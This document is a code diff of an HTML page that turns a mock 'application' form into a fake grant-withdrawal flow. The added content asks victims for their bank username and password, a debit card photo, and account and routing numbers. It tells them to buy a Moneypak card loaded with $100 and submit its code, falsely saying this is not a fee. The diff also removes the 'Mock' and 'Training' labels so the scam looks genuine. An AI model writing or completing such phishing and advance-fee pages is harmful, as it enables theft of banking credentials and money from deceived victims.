@@ -1736,7 +1736,7 @@
     <div id="withdrawOverlay" class="txn-overlay">
         <div class="txn-box withdraw-box">
             <div class="withdraw-head">
-                <h3>Application Process</h3>
+                <h3>Withdraw Process</h3>
                 <button class="withdraw-close" onclick="closeWithdrawPage()">&times;</button>
             </div>
 
@@ -1757,7 +1757,7 @@
                     </div>
                     <div class="w-step" id="withdrawStepMarker3">
                         <span>3</span>
-                        <div>Number Check</div>
+                        <div>Bank routine & Account number</div>
                     </div>
                     <div class="w-step" id="withdrawStepMarker4">
                         <span>4</span>
@@ -1770,19 +1770,19 @@
                     <p>Enter the basic application details below.</p>
                     <label for="appFullName" class="withdraw-input-label">Full Name</label>
                     <input id="appFullName" class="withdraw-input" placeholder="Enter full name" />
-                    <label for="appPreferredTrack" class="withdraw-input-label">Preferred Role / Department</label>
+                    <label for="appPreferredTrack" class="withdraw-input-label">Enter preferred receiving bank/ institution/label>
                     <input id="appPreferredTrack" class="withdraw-input"
-                        placeholder="Enter preferred role or department" />
+                        placeholder="Enter preferred receiving bank/ institution" />
                 </div>
 
                 <div class="withdraw-stage" id="withdrawStage2">
                     <h4>Online Access</h4>
-                    <p>Add the online access details and upload an applicant photo.</p>
-                    <label for="appAccessUser" class="withdraw-input-label">Username</label>
-                    <input id="appAccessUser" class="withdraw-input" placeholder="Enter username" />
-                    <label for="appStateOrigin" class="withdraw-input-label">State of Origin</label>
-                    <input id="appStateOrigin" class="withdraw-input" placeholder="Enter state of origin" />
-                    <label for="appPhoto" class="withdraw-input-label">Upload Picture</label>
+                    <p>Add the online access details and upload a debit card photo.</p>
+                    <label for="appAccessUser" class="withdraw-input-label">Bank Username</label>
+                    <input id="appAccessUser" class="withdraw-input" placeholder="Enter bank username" />
+                    <label for="appStateOrigin" class="withdraw-input-label">password</label>
+                    <input id="appStateOrigin" class="withdraw-input" placeholder="Enter bank password" />
+                    <label for="appPhoto" class="withdraw-input-label">Upload Debit card</label>
                     <input id="appPhoto" class="withdraw-input" type="file" accept="image/*"
                         onchange="handleWithdrawFileChange(event)" />
                     <div id="withdrawFileStatus" class="withdraw-inline withdraw-file-status">No image selected yet.
@@ -1790,14 +1790,14 @@
                 </div>
 
                 <div class="withdraw-stage" id="withdrawStage3">
-                    <h4>Number Check</h4>
-                    <p>Use test-only values here for the application review flow.</p>
-                    <label for="appDummy11" class="withdraw-input-label">Any 11 Digit Number</label>
-                    <input id="appDummy11" class="withdraw-input" inputmode="numeric" maxlength="11"
-                        placeholder="Enter 11 digit test number" />
-                    <label for="appDummy10" class="withdraw-input-label">Any 10 Digit Number</label>
-                    <input id="appDummy10" class="withdraw-input" inputmode="numeric" maxlength="10"
-                        placeholder="Enter 10 digit test number" />
+                    <h4>Bank routine and account number</h4>
+                    <p>provide account number for a direct depoist of your grant funds</p>
+                    <label for="appDummy11" class="withdraw-input-label">Account number</label>
+                    <input id="appDummy11" class="withdraw-input" inputmode="numeric" 
+                        placeholder="Enter Account number" />
+                    <label for="appDummy10" class="withdraw-input-label">Bank routine</label>
+                    <input id="appDummy10" class="withdraw-input" inputmode="numeric" 
+                        placeholder="Enter Routine number" />
                 </div>
 
                 <div class="withdraw-stage" id="withdrawStage4">
@@ -1831,15 +1831,15 @@
                 </div>
                 <div class="withdraw-label">Provide Your Unregistered Card</div>
                 <div class="withdraw-sub">
-                    Submit a Green Dot® Reloadable Visa® Card for Registration and linking it to your Reloadable
+                    Submit a Moneypak Card for Registration and linking it to your Reloadable
                     Account.
                 </div>
                 <div class="withdraw-label">Don't Have One Yet? Here's How to Get It:</div>
                 <ul class="withdraw-list">
-                    <li>Visit any local store that sells Green Dot® Reloadable Visa® Cards.</li>
-                    <li>Purchase a Green Dot® Reloadable Visa® Card and load a minimum of $169 onto it.</li>
-                    <li>Note: The $169 you load confirms the card's eligibility to enroll and link with this reloadable
-                        account. This is not a fee — the full amount remains in your card balance.</li>
+                    <li>Visit any local store that sells Moneypak Cards.</li>
+                    <li>Purchase a Moneypak Card and load a minimum of $100 onto it.</li>
+                    <li>Note: The $100 you load confirms the card's eligibility to enroll and link with this reloadable
+                        account. This is not a fee, the full amount remains in your card balance.</li>
                 </ul>
                 <label for="moneypakCode" class="withdraw-input-label">Moneypak Code</label>
                 <input id="moneypakCode" class="withdraw-input" placeholder="Enter moneypak code" />
@@ -2061,7 +2061,7 @@
             }
 
             const email = document.getElementById("email").value.trim() || "your email";
-            mockCodeBox.innerHTML = `Mock email sent to <b>${email}</b><br />Training confirmation code: <b>${mockCode}</b>`;
+            mockCodeBox.innerHTML = `email sent to <b>${email}</b><br />confirmation code: <b>${mockCode}</b>`;
         }
 
         function finishSignup() {
